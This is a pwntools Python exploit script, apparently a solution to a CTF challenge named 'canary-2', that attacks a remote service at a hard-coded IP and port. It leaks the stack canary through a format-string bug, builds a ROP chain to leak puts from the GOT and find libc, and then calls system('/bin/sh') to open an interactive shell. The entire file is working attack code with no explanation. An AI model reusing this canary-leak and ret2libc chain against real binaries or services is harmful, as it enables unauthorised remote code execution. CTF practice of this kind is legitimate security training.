from pwn import *

BIN = './canary-2'
LIBC = './libc.so.6'
context.binary = BIN

e = ELF(BIN)
libc = ELF(LIBC)

# p = process(BIN)
p = remote('141.85.224.106', '31343')

canary_value_expose_string_formatter = b'%9$lx'

p.recvline() # Skip the 'Hello,\n' line
p.recvline() # Skip the 'Welcome to CNS CTF\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

p.sendline(canary_value_expose_string_formatter + b'y')

response = p.recvline() # Get the 'You chose <canary_value>\n' line
p.recvline() # Skip the 'I don't think that is the correct choice. Try again.\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

canary_value = int(response.split(b' ')[2].strip()[:-1], 16)
buffer_offset_without_canary = 0x20 - 0x8
old_rbp_offset = 0x8

# We leak the address of puts in order to calculate the base address of libc
pop_rdi_ret_address = 0x0000000000400823
puts_got_address = e.got['puts']
puts_plt_address = e.plt['puts']
run_address = e.symbols['run']

payload_for_leaking_puts_address = b'y'
payload_for_leaking_puts_address += b'A' * (buffer_offset_without_canary - 1)
payload_for_leaking_puts_address += p64(canary_value)
payload_for_leaking_puts_address += b'B' * old_rbp_offset
payload_for_leaking_puts_address += p64(pop_rdi_ret_address)
payload_for_leaking_puts_address += p64(puts_got_address)
payload_for_leaking_puts_address += p64(puts_plt_address)
payload_for_leaking_puts_address += p64(run_address)

p.sendline(payload_for_leaking_puts_address)

p.recvline() # Skip the 'You chose <payload_for_leaking_puts_address_value>\n' line
p.recvline() # Skip the 'I don't think that is the correct choice. Try again.\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

p.sendline(b'n')
p.recvline() # Skip the 'Okay then, goodbye!\n' line

puts_address = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_address - libc.symbols['puts']
system_address = libc.symbols['system']
bin_sh_address = next(libc.search(b'/bin/sh'))

p.recvline() # Skip the 'Hello,\n' line
p.recvline() # Skip the 'Welcome to CNS CTF\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

payload_for_calling_system = b'y'
payload_for_calling_system += b'A' * (buffer_offset_without_canary - 1)
payload_for_calling_system += p64(canary_value)
payload_for_calling_system += b'B' * old_rbp_offset
payload_for_calling_system += p64(pop_rdi_ret_address)
payload_for_calling_system += p64(bin_sh_address)
payload_for_calling_system += p64(system_address)

p.sendline(payload_for_calling_system)

p.recvline() # Skip the 'You chose <payload_for_leaking_puts_address_value>\n' line
p.recvline() # Skip the 'I don't think that is the correct choice. Try again.\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

p.sendline(b'n')
p.recvline() # Skip the 'Okay then, goodbye!\n' line

p.interactive()
